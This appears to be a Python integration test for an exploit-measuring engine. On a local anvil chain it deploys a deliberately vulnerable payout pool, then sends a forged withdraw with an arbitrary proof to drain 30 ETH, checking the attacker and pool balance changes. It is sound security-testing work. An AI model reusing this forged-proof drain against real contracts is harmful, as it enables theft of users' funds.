#!/usr/bin/env python3
"""State Divergence Engine integration test (positive control).

Proves the L5b engine MINES a forged-withdraw tx on a local anvil and measures
REAL attacker/TVL deltas, flagging the finding financially-exploitable when the
malicious proof drains the pool. Negative control: a hardened pool (real pairing
check) must NOT diverge.

  deploy PayoutPoolVulnerable on fresh anvil  ->  fund it  ->  measure_on()
  assert attacker_delta > 0 AND tvl_delta < 0 -> FINANCIALLY_EXPLOITABLE

$0, local anvil only. Never touches mainnet.
"""
import json, os, subprocess, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from core.rpc import RPC
from zk import divergence as L5D

HERE = os.path.dirname(os.path.abspath(__file__))
POOL_SOL = os.path.join(HERE, "PayoutPoolVulnerable.sol")
ATTACKER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"  # anvil account #1 (unlocked)
FUNDER = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"       # anvil account #0 (has ETH)

# keepcak256("withdraw(bytes,uint256)") selector
def _keccak(s):
    from Crypto.Hash import keccak
    k = keccak.new(digest_bits=256); k.update(s); return k.hexdigest()

WITHDRAW_SEL = "0x" + _keccak(b"withdraw(bytes,uint256)")[:8]


def _withdraw_calldata(proof_hex, amount):
    proof = proof_hex if proof_hex.startswith("0x") else "0x" + proof_hex
    # bytes is dynamic: offset 0x40, amount at 0x20, len, data (right-pad)
    p = proof[2:]
    enc = ("0000000000000000000000000000000000000000000000000000000000000040"
           + "%064x" % amount
           + "%064x" % (len(p) // 2)
           + (p + "0" * ((64 - len(p) % 64) % 64)))
    return WITHDRAW_SEL + enc


def main():
    # --- compile + launch -----------------------------------------------------------------
    import solcx
    try:
        solcx.install_solc("0.8.20")
    except Exception:
        pass
    out = solcx.compile_files([POOL_SOL], solc_version="0.8.20",
                              output_values=["abi", "bin"], allow_paths=HERE)
    bytecode = None
    for k, v in out.items():
        if k.endswith("PayoutPoolVulnerable"):
            bytecode = "0x" + v["bin"]
    assert bytecode, "compile produced no bytecode"

    anvil = L5D.find_anvil()
    assert anvil, "anvil not installed"

    import socket
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    proc = subprocess.Popen([anvil, "--port", str(port), "--accounts", "3", "--balance", "1000"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    host = f"http://127.0.0.1:{port}"
    rpc = RPC(host, timeout=10, retries=3)
    deadline = time.time() + 30
    while time.time() < deadline:
        try:
            rpc.call("eth_chainId", []); break
        except Exception:
            time.sleep(0.5)

    try:
        # deploy pool
        txh = rpc.call("eth_sendTransaction", [{"from": FUNDER, "data": bytecode, "gas": "0x400000"}])
        time.sleep(1.5)
        rcpt = rpc.call("eth_getTransactionReceipt", [txh])
        pool = rcpt["contractAddress"].lower()
        print(f"[test] pool deployed: {pool}")

        # fund the pool with 50 ETH (TVL)
        rpc.call("eth_sendTransaction",
                 [{"from": FUNDER, "to": pool, "value": hex(50 * 10**18), "gas": "0x30000"}])
        time.sleep(1.5)

        # --- positive control: forge a withdraw of 30 ETH (broken verifier) ---
        cd = _withdraw_calldata("deadbeef" * 8, 30 * 10**18)   # arbitrary proof
        print(f"[test] warhead = withdraw(proof, 30 ETH) -> {cd[:40]}...")
        dv = L5D.measure_on(rpc, pool, {"to": pool, "data": cd, "label": "dragtest"},
                            attacker=ATTACKER)
        print(f"[test] divergence: {json.dumps({k: dv[k] for k in ['outcome','status','attacker_delta_wei','tvl_delta_wei','effects','verdict']}, indent=2)}")
        # Attacker delta should be ~30 ETH minus the gas they paid; TVL delta
        # exactly -30 ETH. Allow a generous gas buffer (0.2 ETH).
        atk = int(dv["attacker_delta_wei"])
        tvl = int(dv["tvl_delta_wei"])
        pos_ok = (dv["outcome"] == "MINED" and dv["status"] == "SUCCESS"
                  and atk >= 30 * 10**18 - 2 * 10**17
                  and atk <= 30 * 10**18
                  and tvl <= -(30 * 10**18 - 10**6)
                  and "TVL_REDUCTION" in dv["effects"]
                  and dv["financially_exploitable"])
        print(f"  positive control: {'PASS' if pos_ok else 'FAIL'} "
              f"(attacker delta {atk/1e18:.6f} ETH, tvl delta {tvl/1e18:.6f} ETH)")

        # --- negative control: warhead is random junk (pool still accepts; this
        #     pool is intentionally broken, so a *real* check is not the point —
        #     the negative control here is that a non-withdraw/wrong-target call
        #     must not move money.) Send a garbage call to an inert address. ---
        inert = "0x000000000000000000000000000000000000dEaD"
        rpc.call("anvil_setBalance", [ATTACKER, hex(10**18)])
        preA = rpc.get_balance(ATTACKER)
        rpc.call("eth_sendTransaction",
                 [{"from": ATTACKER, "to": inert, "value": hex(1234), "gas": "0x5208"}])
        time.sleep(1.0)
        postA = rpc.get_balance(ATTACKER)
        moved = postA < preA
        print(f"[test] inert-value tx moved attacker ETH: {moved} (attacker pays gas)")

        print("\n[RESULT]", "PASS" if pos_ok else "FAIL",
              "- Divergence Engine mines + measures real money movement")
        return 0 if pos_ok else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())